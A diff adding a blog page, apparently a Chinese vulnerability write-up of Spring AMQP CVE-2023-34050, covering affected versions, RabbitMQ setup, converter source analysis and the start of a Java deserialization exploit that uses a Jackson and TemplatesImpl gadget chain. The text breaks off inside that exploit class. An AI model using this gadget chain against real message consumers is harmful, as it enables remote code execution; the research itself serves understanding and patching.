@@ -1,0 +1,759 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Prefacehttps:&#x2F;&#x2F;spring.io&#x2F;security&#x2F;cve-2023-34050 官方描述：默认情况下没有提供允许序列化的列表，所有类都可能被反序列化。  In 2016, allowed list patterns for deserializable class names were added to Spring AMQP, allowing users to lock do">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring-AMQP CVE-2023-34050">
+<meta property="og:url" content="http://example.com/2023/11/10/amqp/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="Prefacehttps:&#x2F;&#x2F;spring.io&#x2F;security&#x2F;cve-2023-34050 官方描述：默认情况下没有提供允许序列化的列表，所有类都可能被反序列化。  In 2016, allowed list patterns for deserializable class names were added to Spring AMQP, allowing users to lock do">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/image-20231115101034328.png">
+<meta property="og:image" content="http://example.com/img/image-20231115114049007.png">
+<meta property="og:image" content="http://example.com/img/image-20231115132210036.png">
+<meta property="og:image" content="http://example.com/img/image-20231115143523988.png">
+<meta property="og:image" content="http://example.com/img/image-20231115143419035.png">
+<meta property="og:image" content="http://example.com/img/image-20231115152738472.png">
+<meta property="og:image" content="http://example.com/img/image-20231115152900658.png">
+<meta property="og:image" content="http://example.com/img/image-20231115153226050.png">
+<meta property="og:image" content="http://example.com/img/image-20231115153720545.png">
+<meta property="og:image" content="http://example.com/img/image-20231115154331721.png">
+<meta property="og:image" content="http://example.com/img/image-20231115160159431.png">
+<meta property="og:image" content="http://example.com/img/image-20231115160742349.png">
+<meta property="og:image" content="http://example.com/img/image-20231115161138831.png">
+<meta property="og:image" content="http://example.com/img/image-20231115195356205.png">
+<meta property="og:image" content="http://example.com/img/image-20231115195440766.png">
+<meta property="og:image" content="http://example.com/img/image-20231115202205838.png">
+<meta property="og:image" content="http://example.com/img/image-20231115202326118.png">
+<meta property="article:published_time" content="2023-11-10T02:45:08.000Z">
+<meta property="article:modified_time" content="2023-11-15T12:26:21.376Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="middleware">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/image-20231115101034328.png">
+  
+  
+  
+  <title>Spring-AMQP CVE-2023-34050 - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Spring-AMQP CVE-2023-34050"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-10 10:45" pubdate>
+          2023年11月10日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          82 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Spring-AMQP CVE-2023-34050</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p><a target="_blank" rel="noopener" href="https://spring.io/security/cve-2023-34050">https://spring.io/security/cve-2023-34050</a></p>
+<p>官方描述：默认情况下没有提供允许序列化的列表，所有类都可能被反序列化。</p>
+<blockquote>
+<p>In 2016, allowed list patterns for deserializable class names were added to Spring AMQP, allowing users to lock down deserialization of data in  messages from untrusted sources; however by default, when no allowed  list was provided, all classes could be deserialized.</p>
+</blockquote>
+<p>漏洞条件：</p>
+<ul>
+<li>使用<code>SimpleMessageConverter</code>或<code>SerializerMessageConverter</code></li>
+<li>用户未设置允许反序列化的名单</li>
+<li>未受信任的信息发起者获取往<code>RabbitMQ broker</code>写消息的权限</li>
+</ul>
+<p>影响版本：</p>
+<ul>
+<li>Spring AMQP<ul>
+<li>1.0.0 ~ 2.4.16</li>
+<li>3.0.0 ~ 3.0.9</li>
+</ul>
+</li>
+</ul>
+<h1 id="AMQP-Intro"><a href="#AMQP-Intro" class="headerlink" title="AMQP Intro"></a>AMQP Intro</h1><p>AMQP：Advanced Message Queuing Protocol 高级消息队列协议，是一个网络协议，它支持符合条件的客户端和消息代理中间件（message middleware broker）进行通讯。<code>RabbitMQ</code>是AMQP协议的实现者，所以AMQP中的概念和准则也适用于<code>RabbitMQ</code>。</p>
+<p>消息：两个应用间传递的数据（数据可能是文本字符串或者序列化对象等，多种可能）</p>
+<p>消息队列：在消息传输过程中保存消息的容器，生产者负责写消息到MQ，消费者负责从MQ读消息</p>
+<p>为什么需要消息队列？</p>
+<ul>
+<li>解耦：假如系统B、C、D都需要A的数据，若后面D不需要A数据了，且有新系统E加入，需要A数据，那么A就需要删除和增加相关的代码，无疑是一种强耦合。使用MQ，A只需要发送数据给MQ，其他系统需要数据从MQ获取即可</li>
+</ul>
+<p><img src="/./../img/image-20231115101034328.png" srcset="/img/loading.gif" lazyload alt="image-20231115101034328"></p>
+<ul>
+<li><p>异步：客户端的请求进行，系统A调用B、C、D三个系统，若同步请求，响应时间为B、C、D处理的总和。使用MQ，A直接返回响应给客户端，无需等待B、C、D的响应，大大提高速度，常见于发送短信、邮件等业务。</p>
+</li>
+<li><p>削峰：短时间内大量请求涌入系统A，比如都是进行SQL执行，若A直接发送SQL给数据库进行执行，数据库当然处理不来如此庞大的请求，导致系统瘫痪。使用MQ,A把数据发送到MQ，MQ短时间挤压数据可以接受，再由消费者少量多次拉取数据进行处理。</p>
+</li>
+</ul>
+<p>在JMS中，有两种类型的消息通道：</p>
+<ol>
+<li>点对点的Queue，即Producer发送消息到指定的Queue，接收方从Queue收取消息；</li>
+<li>一对多的Topic，即Producer发送消息到指定的Topic，任意多个在线的接收方均可从Topic获得一份完整的消息副本。</li>
+</ol>
+<p>但在AMQP中，只有Queue没有Topic，但引入了Exchange的概念。当Producer想要发送消息的时候，它将消息发送给Exchange，由Exchange将消息根据各种规则投递到一个或多个Queue：</p>
+<p><img src="/./../img/image-20231115114049007.png" srcset="/img/loading.gif" lazyload alt="image-20231115114049007"></p>
+<p>如果某个Exchange总是把消息发送到固定的Queue，那么这个消息通道就相当于JMS的Queue。如果某个Exchange把消息发送到多个Queue，那么这个消息通道就相当于JMS的Topic。</p>
+<p><code>RabbitMQ</code>是一款使用<code>Erlang</code>语言开发的，实现AMQP(高级消息队列协议)的开源消息中间件，当然它也支持其他协议，如STOMP、MQTT</p>
+<p><code>Spring-AMQP</code>是对AMQP协议的抽象实现，而<code>Spring-Rabbit</code>是对协议的具体实现，也是目前的唯一实现。底层使用的就是<code>RabbitMQ</code>。</p>
+<p>使用IDEA的<code>Spring Initializr</code>创建Spring Boot项目，添加依赖<code>Spring for RabbitMQ</code></p>
+<p><img src="/./../img/image-20231115132210036.png" srcset="/img/loading.gif" lazyload alt="image-20231115132210036"></p>
+<p><code>2.7.17</code>对应的<code>Spring-AMQP</code>还不是漏洞版本，<code>spring-boot-starter-parent</code>改成<code>2.7.14</code></p>
+<p>IDEA的外部依赖库可以看到对应<code>Spring-AMQP</code>版本为<code>2.4.14</code></p>
+<p><code>pom.xml</code>看到依赖项</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>要使用RabbitMQ还得安装<code>Erlang</code>，为方便直接装docker</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -d --name rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq:management<br></code></pre></td></tr></table></figure>
+
+<p><code>15672</code>是web控制台的端口，默认账号密码为<code>guest/guest</code></p>
+<h2 id="Producer"><a href="#Producer" class="headerlink" title="Producer"></a>Producer</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><br><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-string">ip</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">guest</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">guest</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.producer;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(ProducerApplication.class, args);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">myQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">&quot;myQueue&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.producer.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> javax.annotation.Resource;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendController</span> &#123;<br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/send&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uuid</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;myQueue&quot;</span>, <span class="hljs-string">&quot;hello world &quot;</span> + i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231115143523988.png" srcset="/img/loading.gif" lazyload alt="image-20231115143523988"></p>
+<h2 id="Consumer"><a href="#Consumer" class="headerlink" title="Consumer"></a>Consumer</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">rabbitmq:</span><br>    <span class="hljs-attr">host:</span> <span class="hljs-string">ip</span><br>    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">guest</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-string">guest</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.consumer;<br><br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsumerApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(ConsumerApplication.class, args);<br>    &#125;<br><br>    <span class="hljs-meta">@RabbitListener(queues = &quot;myQueue&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receive</span><span class="hljs-params">(String msg, Channel channel, Message message)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Id: &quot;</span> + message.getMessageProperties().getDeliveryTag());<br>        System.out.println(<span class="hljs-string">&quot;Message: &quot;</span> + msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231115143419035.png" srcset="/img/loading.gif" lazyload alt="image-20231115143419035"></p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="Producer-1"><a href="#Producer-1" class="headerlink" title="Producer"></a>Producer</h2><p>客户端生产者调用<code>RabbitTemplate#convertAndSend</code>传入了两个参数，分别是队列名和Java对象</p>
+<p><img src="/./../img/image-20231115152738472.png" srcset="/img/loading.gif" lazyload alt="image-20231115152738472"></p>
+<p>Java对象会被转化为Amqp的消息类型，这里就要用到消息转化器。</p>
+<p>默认的消息转换器是<code>SimpleMessageConverter</code></p>
+<p><img src="/./../img/image-20231115152900658.png" srcset="/img/loading.gif" lazyload alt="image-20231115152900658"></p>
+<p>接着调用<code>AbstractMessageConverter#toMessage</code>将Java对象转化为Message对象，这里的<code>MessageProperties</code>应该类似于消息头，存储一些消息的元数据。</p>
+<p><img src="/./../img/image-20231115153226050.png" srcset="/img/loading.gif" lazyload alt="image-20231115153226050"></p>
+<p><code>createMessage</code>由<code>AbstractMessageConverter</code>的子类实现。看看<code>SimpleMessageConverter#createMessage</code></p>
+<p><img src="/./../img/image-20231115153720545.png" srcset="/img/loading.gif" lazyload alt="image-20231115153720545"></p>
+<p>可以看到<code>SimpleMessageConverter</code>只支持转换字符串、字节数组和实现<code>Serializable</code>的类对象，且最终都会转成byte数组，再传入<code>Message</code>的构造器中。</p>
+<p>在<code>Serializable</code>子类的情况下，会设置<code>MessageProperties</code>的<code>Content-Type</code>为<code>application/x-java-serialized-object</code></p>
+<p><code>SerializationUtils#serialize</code>使用的就是纯粹的Java原生序列化。</p>
+<p><img src="/./../img/image-20231115154331721.png" srcset="/img/loading.gif" lazyload alt="image-20231115154331721"></p>
+<p>根据官方描述，还有另一个转化器<code>SerializerMessageConverter</code>，看了它的<code>createMessage</code>方法和<code>SimpleMessageConverter</code>一样</p>
+<p>此外<code>Spring AMQP</code>还提供了<code>Jackson2JsonMessageConverter</code>，将Java对象自动序列化为JSON并以文本消息传递。</p>
+<p>想要更换消息转化器，在<code>ProducerApplication</code>中加上下面的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br>MessageConverter <span class="hljs-title function_">createMessageConverter</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerMessageConverter</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Consumer-1"><a href="#Consumer-1" class="headerlink" title="Consumer"></a>Consumer</h2><p>客户端消费者使用<code>@RabbitListener</code>注解监听指定的队列，当收到消息后，会调用对应消息转化器的<code>fromMessage</code>方法</p>
+<p>默认依旧是<code>SimpleMessageConverter</code></p>
+<p><img src="/./../img/image-20231115160159431.png" srcset="/img/loading.gif" lazyload alt="image-20231115160159431"></p>
+<p><code>createObjectInputStream</code>创建的<code>ObjectInputStream</code>重写了<code>resolveClass</code></p>
+<p><img src="/./../img/image-20231115160742349.png" srcset="/img/loading.gif" lazyload alt="image-20231115160742349"></p>
+<p><code>checkAllowedList</code>是<code>SimpleMessageConverter</code>父类<code>AllowedListDeserializingMessageConverter</code>的方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; allowedListPatterns = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;String&gt;();<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkAllowedList</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> &#123;<br>    SerializationUtils.checkAllowedList(clazz, <span class="hljs-built_in">this</span>.allowedListPatterns);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./../img/image-20231115161138831.png" srcset="/img/loading.gif" lazyload alt="image-20231115161138831"></p>
+<p>一些基本类就没有检测了，对反序列化的类进行了模式匹配，不过默认这个<code>allowedListPatterns</code>为空</p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>看到这应该就很显然了，打Jackson的链子，生产者直接往RabbitMQ里写恶意类对象，消费者读取后会触发反序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo.producer.controller;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Gadget</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span 